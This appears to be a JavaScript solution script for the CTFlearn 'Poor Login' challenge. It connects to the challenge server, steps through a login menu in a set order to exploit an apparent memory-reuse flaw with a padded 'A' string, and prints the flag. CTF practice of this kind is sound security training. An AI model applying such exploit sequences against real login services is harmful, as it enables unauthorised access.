/**
 * https://ctflearn.com/challenge/1013 - Poor Login
 */

const { Remote, convo } = require("../pwn");

(async () => {
    const remote = Remote.create("thekidofarcrania.com", 13226);

    const selectMenu = async (c) => remote.onceDataAsync('5. Restore user.\n> ').then(() => remote.send(c + "\n"));

    await selectMenu(1);
    await remote.send("\n");

    await selectMenu(4);
    await selectMenu(2);
    await selectMenu(3);
    await remote.send("A".repeat(0x30 - 1) + "\n");
    await selectMenu(5);
    await selectMenu(3);
    const [_, flag] = await remote.onceLinesAsync(2);

    console.log(flag);
    process.exit(1);
})();
